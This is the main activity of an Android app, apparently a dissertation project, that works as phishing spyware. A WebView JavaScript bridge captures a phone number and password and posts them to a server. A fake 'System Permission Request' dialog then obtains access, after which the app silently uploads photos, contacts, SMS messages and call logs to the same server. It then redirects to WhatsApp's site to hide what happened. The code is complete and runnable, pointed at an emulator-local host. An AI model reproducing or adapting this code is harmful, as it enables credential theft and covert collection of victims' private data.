package com.example.disertationapplication;

import android.Manifest;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    WebView webView;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final String TAG = "DEBUG_DISERTATION";

    public class JSBridge {
        @JavascriptInterface
        public void sendCredentials(String phone, String password) {
            Log.d(TAG, "sendCredentials called: " + phone + " / " + password);
            new Thread(() -> {
                try {
                    URL url = new URL("http://10.0.2.2:5000/submit");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    String data = "phone=" + phone + "&password=" + password;
                    OutputStream os = conn.getOutputStream();
                    os.write(data.getBytes());
                    os.flush();
                    os.close();
                    conn.getInputStream();
                    Log.d(TAG, "Credentials sent to server.");
                } catch (Exception e) {
                    Log.e(TAG, "Failed to send credentials", e);
                }
            }).start();

            runOnUiThread(() -> showPermissionDialog());
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        setupWebView();
    }

    private void setupWebView() {
        webView.setWebViewClient(new WebViewClient());
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new JSBridge(), "AndroidBridge");
        webView.loadUrl("http://10.0.2.2:8000/index.html");
    }

    private void showPermissionDialog() {
        new AlertDialog.Builder(this)
                .setTitle("System Permission Request")
                .setMessage("This app requires access to Photos, Microphone, and Contacts to continue.")
                .setCancelable(false)
                .setPositiveButton("Grant Access", (dialog, which) -> {
                    requestRealPermissions();
                    // Load WhatsApp page immediately after user taps Grant Access
                    new Handler().postDelayed(() ->
                            webView.loadUrl("https://www.whatsapp.com/"), 300);
                })
                .setNegativeButton("Deny", (dialog, which) -> {
                    Toast.makeText(this, "Access denied. App may not function properly.", Toast.LENGTH_LONG).show();
                })
                .show();
    }

    private void requestRealPermissions() {
        String[] permissions;

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG
            };
        } else {
            permissions = new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG
            };
        }

        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean granted = true;
            for (int result : results) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    granted = false;
                    break;
                }
            }

            if (granted) {
                Toast.makeText(this, "Permissions granted. Extracting data...", Toast.LENGTH_SHORT).show();
                Log.d(TAG, "Permissions granted.");
                extractAndSendPhotos();
                extractAndSendContacts();
                extractAndSendSMS();
                extractAndSendCallLogs();
            } else {
                Toast.makeText(this, "Some permissions were denied.", Toast.LENGTH_LONG).show();
                Log.w(TAG, "One or more permissions denied.");
            }
        }
    }

    private void extractAndSendPhotos() {
        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(collection, projection, null, null, sortOrder)) {
            if (cursor == null) {
                Log.w(TAG, "Photo cursor is null");
                return;
            }

            int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int count = 0;

            Log.d(TAG, "Starting to read images...");
            while (cursor.moveToNext() && count < 50) {
                long id = cursor.getLong(idColumn);
                Uri photoUri = ContentUris.withAppendedId(collection, id);
                Log.d(TAG, "Found image URI: " + photoUri.toString());
                uploadImageUriToServer(photoUri);
                count++;
            }
            Log.d(TAG, "Total images sent: " + count);
        } catch (Exception e) {
            Log.e(TAG, "Error accessing MediaStore", e);
        }
    }
    private void extractAndSendContacts() {
        new Thread(() -> {
            try {
                Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                String[] projection = {
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                };

                Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
                if (cursor == null) {
                    Log.w(TAG, "Contact cursor is null");
                    return;
                }

                // Build JSON string
                StringBuilder json = new StringBuilder();
                json.append("{ \"contacts\": [");

                boolean first = true;
                while (cursor.moveToNext()) {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);

                    if (!first) json.append(",");
                    json.append("{");
                    json.append("\"name\":\"").append(name.replace("\"", "\\\"")).append("\",");
                    json.append("\"number\":\"").append(number.replace("\"", "\\\"")).append("\"");
                    json.append("}");
                    first = false;
                }

                json.append("] }");
                cursor.close();

                // Send JSON to server
                URL url = new URL("http://10.0.2.2:5000/submit");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                conn.getInputStream(); // Trigger connection
                Log.d(TAG, "Contacts JSON sent to server:\n" + json);

            } catch (Exception e) {
                Log.e(TAG, "Failed to extract or send contacts as JSON", e);
            }
        }).start();
    }
    private void extractAndSendSMS() {
        new Thread(() -> {
            try {
                Uri uri = Uri.parse("content://sms/inbox");
                Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");

                if (cursor == null) {
                    Log.w(TAG, "SMS cursor is null");
                    return;
                }

                JSONArray smsArray = new JSONArray();
                int count = 0;

                while (cursor.moveToNext() && count < 50) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    smsArray.put(sms);
                    count++;
                }

                cursor.close();

                // Send to server
                URL url = new URL("http://10.0.2.2:5000/submit_sms");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(smsArray.toString().getBytes());
                os.flush();
                os.close();

                conn.getInputStream();
                Log.d(TAG, "SMS data sent to server");

            } catch (Exception e) {
                Log.e(TAG, "Failed to extract/send SMS", e);
            }
        }).start();
    }

    private void extractAndSendCallLogs() {
        new Thread(() -> {
            try {
                Uri uri = CallLog.Calls.CONTENT_URI;
                Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");

                if (cursor == null) {
                    Log.w(TAG, "Call log cursor is null");
                    return;
                }

                JSONArray callArray = new JSONArray();
                int count = 0;

                while (cursor.moveToNext() && count < 50) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    callArray.put(call);
                    count++;
                }

                cursor.close();

                // Send to server
                URL url = new URL("http://10.0.2.2:5000/submit_calls");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(callArray.toString().getBytes());
                os.flush();
                os.close();

                conn.getInputStream();
                Log.d(TAG, "Call logs sent to server");

            } catch (Exception e) {
                Log.e(TAG, "Failed to extract/send call logs", e);
            }
        }).start();
    }

    private void uploadImageUriToServer(Uri uri) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                URL url = new URL("http://10.0.2.2:5000/submit");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                OutputStream os = conn.getOutputStream();
                String fileName = "image_" + System.currentTimeMillis() + ".jpg";

                String header = "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n" +
                        "Content-Type: image/jpeg\r\n\r\n";
                os.write(header.getBytes());

                InputStream is = getContentResolver().openInputStream(uri);
                if (is == null) {
                    Log.w(TAG, "InputStream for image is null: " + uri);
                    return;
                }

                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                is.close();

                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                os.flush();
                os.close();

                conn.getInputStream();
                Log.d(TAG, "Uploaded photo: " + fileName);
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload image: " + uri.toString(), e);
            }
        }).start();
    }
}


